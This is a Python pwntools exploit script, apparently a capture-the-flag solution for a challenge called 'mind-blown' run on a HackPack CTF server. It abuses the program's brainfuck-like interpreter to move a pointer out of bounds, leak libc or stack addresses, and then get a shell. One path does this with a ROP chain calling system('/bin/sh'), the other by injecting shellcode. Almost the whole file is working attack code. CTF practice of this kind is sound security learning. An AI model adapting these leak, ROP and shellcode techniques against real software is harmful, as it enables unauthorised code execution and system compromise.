from pwn import *

#p = process("./mind-blown",env = {"LD_PRELOAD" : "./libc-2.28.so"})
p = remote("ctf2021.hackpack.club", 10996)

'''
-data = open("/proc/%d/maps"%p.pid,"r").readlines()
-print("".join(data))
-'''
p.sendlineafter("program:",str(0x2000))


'''
-+  buf[pc]++
--  buf[pc]--
-,  buf[pc] = stdin
-.  puts(buf[pc])
-<  pc-- (not be 0)
->  pc++
-
-data = rbp-1010h
'''
def exp_way_1():
       payload = ">"*0x1018 + ">"*32
       payload += ".>"*8  #leak
       payload += "<"*8*5
       payload += ",>"*8*8
       payload = payload.ljust(0x2000,">")

       #gdb.attach(p)
       p.sendafter("text",payload)
       p.recvuntil('\n')
       data = p.recv(8)
       __libc_start_main_ret = u64(data)
       libc_base = __libc_start_main_ret - libc.sym['__libc_start_main'] - 235
       #print(hex(__libc_start_main_ret))


       print("libc_base : " + hex(libc_base))

       pop_rdi_ret = 0x0000000000401653
       pop_rsi_pop_r15_ret = 0x0000000000401651
       pop_rdx_ret = libc_base + 0x0000000000001b9a#0x00000000001290c6#0x0000000000106725
       system = libc_base + libc.sym['system']
       binsh = libc_base + next(libc.search(b'/bin/sh'))
       execve = libc_base + libc.sym['execve']

       rop = p64(pop_rdi_ret)
       rop += p64(binsh)
       rop += p64(pop_rsi_pop_r15_ret)
       rop += p64(0)
       rop += p64(0)
       rop += p64(system)
       rop += p64(system)
       p.send(rop)


       p.interactive()

def exp_way_2():
       payload = ">"*0x1010
       payload += ".>"*8  #leak
       payload += ",>"*8*7

       payload = payload.ljust(0x2000,">")
       #gdb.attach(p)
       p.sendafter("text",payload)
       p.recvuntil('\n')
       data = p.recv(8)
       shellcode_addr = u64(data) - 0x10 # ret to main
       print(hex(u64(data)))
       print(hex(shellcode_addr))
       shellcode = asm(shellcraft.amd64.sh(),arch = 'amd64')
       shellcode = shellcode.ljust(8*7,b'\x90')
       #raw_input()
       p.send(p64(shellcode_addr) + shellcode)
       p.interactive()


exp_way_2()